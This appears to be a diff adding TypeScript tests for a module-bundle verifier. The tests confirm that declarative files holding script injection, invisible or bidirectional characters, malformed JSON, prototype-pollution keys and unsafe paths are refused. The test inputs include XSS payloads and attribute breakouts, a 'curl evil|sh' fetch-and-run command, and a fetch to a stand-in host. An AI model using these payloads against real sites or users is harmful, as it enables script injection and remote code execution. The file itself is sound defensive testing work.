@@ -168,13 +168,96 @@ test("declarative bundles carry only inert text and never migrations", () => {
     /module_bundle_declarative_file_not_allowed/u);
 });
 
+test("declarative text refuses embedded script, hidden direction or invisible characters, and non-strict JSON", () => {
+  const refuses = (path: string, text: string, code: RegExp) => {
+    const bundle = withFile(declarative(), path, text);
+    assert.throws(() => verifyModuleBundleV1(bundle, undefined, options()), code, `${path}: ${JSON.stringify(text)}`);
+    // Signing never turns a refused declarative file into an accepted one.
+    assert.throws(() => verifyModuleBundleV1(bundle, signModuleBundleV1(bundle, publisher.privateKey, publisher.spki), options()),
+      code, `${path} signed`);
+  };
+  const executable = /module_bundle_declarative_file_executable_content/u;
+  refuses("a.md", "<script>alert(1)</script>", executable);
+  refuses("a.md", "<SCRIPT src=x></SCRIPT>", executable);
+  refuses("a.md", "[x](javascript:alert(1))", executable);
+  refuses("a.md", "[x](JaVa\tScRiPt:alert(1))", executable);
+  refuses("a.md", "[x](vbscript:msgbox(1))", executable);
+  refuses("a.md", "[x](java&#115;cript:alert(1))", executable);
+  refuses("a.md", "[x](javascript&colon;alert(1))", executable);
+  refuses("a.md", "<iframe src=\"https://example.invalid\"></iframe>", executable);
+  refuses("a.md", "<svg/onload=alert(1)>", executable);
+  refuses("a.md", "[x](data:text/html;base64,PHNjcmlwdD4=)", executable);
+  refuses("a.json", "{\"html\":\"<img src=x onerror=alert(1)>\"}", executable);
+  refuses("a.json", "{\"html\":\"<img/onerror=alert(1)>\"}", executable);
+  refuses("a.md", "<img\nsrc=x\nonerror=alert(1)>", executable);
+  // Breaking out of an attribute a template might interpolate this value into.
+  refuses("a.json", "{\"alt\":\"x\\\" onmouseover=\\\"alert(1)\"}", executable);
+  // JSON escapes are decoded before the check, so `\u003c` cannot hide a tag.
+  refuses("a.json", "{\"html\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}", executable);
+  refuses("a.json", "{\"\\u006aavascript:x\":1}", executable);
+  refuses("a.txt", "run $(curl evil|sh)", executable);
+  const notText = /module_bundle_declarative_file_not_text/u;
+  refuses("a.md", "Pay \u202Eecnalab\u202C now", notText);
+  for (const hidden of ["\u200B", "\u200D", "\u200E", "\u061C", "\u2060", "\u2066", "\u2069", "\uFEFF", "\u{E0041}"]) {
+    refuses("a.md", `a${hidden}b`, notText);
+  }
+  refuses("a.md", "\uFEFFleading byte order mark", notText);
+  refuses("a.txt", "next line\u0085here", notText);
+  refuses("a.txt", "c1\u009Bcontrol", notText);
+  refuses("a.json", "{\"a\":\"\\u202Eflip\"}", notText);
+  refuses("a.json", "{\"a\":\"\\u0007bell\"}", notText);
+  refuses("a.json", "{\"a\":\"\\ud800\"}", notText);
+  const json = /module_bundle_declarative_json_invalid/u;
+  refuses("x.js.json", "fetch('http://evil')", json);
+  refuses("a.json", "{\"a\":1,}", json);
+  refuses("a.json", "", json);
+  refuses("a.json", "{\"a\":1} trailing", json);
+  refuses("a.json", "{\"a\":1,\"a\":2}", /module_bundle_declarative_json_duplicate_key/u);
+  refuses("a.json", "{\"outer\":{\"a\":1,\"b\":[{\"k\":1,\"k\":2}]}}", /module_bundle_declarative_json_duplicate_key/u);
+  // Escapes do not disguise a duplicate: "\u0061" is "a".
+  refuses("a.json", "{\"a\":1,\"\\u0061\":2}", /module_bundle_declarative_json_duplicate_key/u);
+  refuses("a.json", "{\"__proto__\":{\"polluted\":true}}", /module_bundle_declarative_file_prototype_pollution_key/u);
+
+  // Ordinary prompt prose, markdown, and JSON stay shareable, including words the CREDENTIAL and
+  // AUTHORITY guards would refuse in manifest text: those are not applied to prompt bodies.
+  const prose = withFile(withFile(withFile(declarative(), "prompts/review.md",
+    "# Reviewer\n\nrole: reviewer. You may grant access in prose, mention a password: field, and cite `code`.\n"
+    + "Use **bold**, [a link](https://example.invalid/docs), <br> breaks, and costs of $5 or (a) lists.\n"
+    + "The button once = twice; online=yes; café, naïve, 日本語, emoji 🎉.\n"),
+  "templates/nested.json", "[{\"a\":{\"b\":[1,2,{\"a\":3}]},\"k\":\"v\"},{\"a\":\"same key, other object\"}]"),
+  "notes.txt", "tabs\tand\r\nnewlines are fine\n");
+  assert.equal(verifyModuleBundleV1(prose, undefined, options()).source.kind, "declarative-unsigned");
+
+  // Near-limit hostile text stays fast: none of the checks backtrack across the file.
+  for (const text of ["<".repeat(1_000_000), "<a ".repeat(330_000), "j \t".repeat(330_000), "\" /".repeat(330_000), "&#".repeat(500_000)]) {
+    const started = performance.now();
+    try { verifyModuleBundleV1(withFile(declarative(), "big.txt", text), undefined, options()); } catch { /* either answer is fine */ }
+    assert.ok(performance.now() - started < 2_000, `${JSON.stringify(text.slice(0, 3))} took too long`);
+  }
+  const deep = `${"[".repeat(5_000)}${"]".repeat(5_000)}`;
+  assert.throws(() => verifyModuleBundleV1(withFile(declarative(), "deep.json", deep), undefined, options()), /input_too_deep/u);
+});
+
 test("bundle paths, encodings, sizes and shape are strict", () => {
   for (const path of ["../escape.md", "a/../b.md", "/abs.md", "a//b.md", "./a.md", "Readme.md", "a\\b.md", ".hidden.md", "",
     "a/b/c/d/e/f/g/h/i.md", `${"a".repeat(65)}.md`]) {
     assert.throws(() => canonicalModuleBundleV1(withFile(declarative(), path, "x")), /module_bundle_path_invalid/u, path);
   }
+  // Names that would collide or misbehave once staged on disk: a trailing dot (Windows drops it)
+  // and reserved device names, with or without an extension.
+  for (const path of ["a.", "dir./a.md", "a-.", "con", "con.txt", "prompts/aux.md", "nul.json", "com1.md", "lpt9.txt", "prn"]) {
+    assert.throws(() => canonicalModuleBundleV1(withFile(declarative(), path, "x")), /module_bundle_path_invalid/u, path);
+  }
+  for (const path of ["console.md", "auxiliary.txt", "com10.md", "prompts/null.md", "a.b.md"]) {
+    assert.doesNotThrow(() => canonicalModuleBundleV1(withFile(declarative(), path, "x")), path);
+  }
   const bundle = declarative();
   assert.throws(() => canonicalModuleBundleV1({ ...bundle, files: [...bundle.files, bundle.files[0]!] }), /module_bundle_duplicate_path/u);
+  // A file may not also be a directory of another file, in either order.
+  assert.throws(() => canonicalModuleBundleV1(withFile(withFile(bundle, "x.md", "a"), "x.md/y.md", "b")), /module_bundle_path_collision/u);
+  assert.throws(() => canonicalModuleBundleV1(withFile(withFile(bundle, "d/e/f.md", "a"), "d", "b")), /module_bundle_path_collision/u);
+  assert.throws(() => canonicalModuleBundleV1(withFile(withFile(bundle, "d", "b"), "d/e/f.md", "a")), /module_bundle_path_collision/u);
+  assert.doesNotThrow(() => canonicalModuleBundleV1(withFile(withFile(bundle, "d/e.md", "a"), "d/ef.md", "b")));
   for (const encoded of ["aGk", "aGk=\n", "aGl=", "a GE=", "!!!!"]) {
     assert.throws(() => canonicalModuleBundleV1({ ...bundle, files: [{ path: "a.md", contentBase64: encoded }] }),
       /module_bundle_file_encoding_invalid/u, encoded);
